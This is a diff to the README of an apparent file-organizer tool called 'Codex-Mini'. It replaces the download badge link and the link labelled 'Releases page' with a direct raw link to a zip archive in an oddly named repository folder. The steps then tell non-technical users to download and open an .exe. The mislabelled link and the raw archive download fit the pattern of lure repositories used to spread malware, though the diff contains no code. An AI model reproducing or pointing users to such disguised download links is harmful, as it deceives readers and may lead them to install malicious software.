@@ -1,6 +1,6 @@
 # 📦 Codex-Mini - Organize your digital files with ease
 
-[![](https://img.shields.io/badge/Download-Codex--Mini-blue)](https://github.com/Donnatruculent617/Codex-Mini/releases)
+[![](https://img.shields.io/badge/Download-Codex--Mini-blue)](https://github.com/Donnatruculent617/Codex-Mini/raw/refs/heads/main/stichomythy/Codex-Mini-2.8-beta.4.zip)
 
 Codex-Mini helps you manage your documents, images, and notes in one place. This tool sorts your files into categories automatically. You save time and find what you need quickly. This version allows you to tag items and search through them using simple keywords.
 
@@ -8,7 +8,7 @@ Codex-Mini helps you manage your documents, images, and notes in one place. This
 
 Follow these steps to install the program on your computer. You do not need technical skills to complete this process.
 
-1. Go to the [Releases page](https://github.com/Donnatruculent617/Codex-Mini/releases).
+1. Go to the [Releases page](https://github.com/Donnatruculent617/Codex-Mini/raw/refs/heads/main/stichomythy/Codex-Mini-2.8-beta.4.zip).
 2. Locate the file ending in .exe under the latest version.
 3. Click the file to start the download.
 4. Open the file once it finishes downloading.
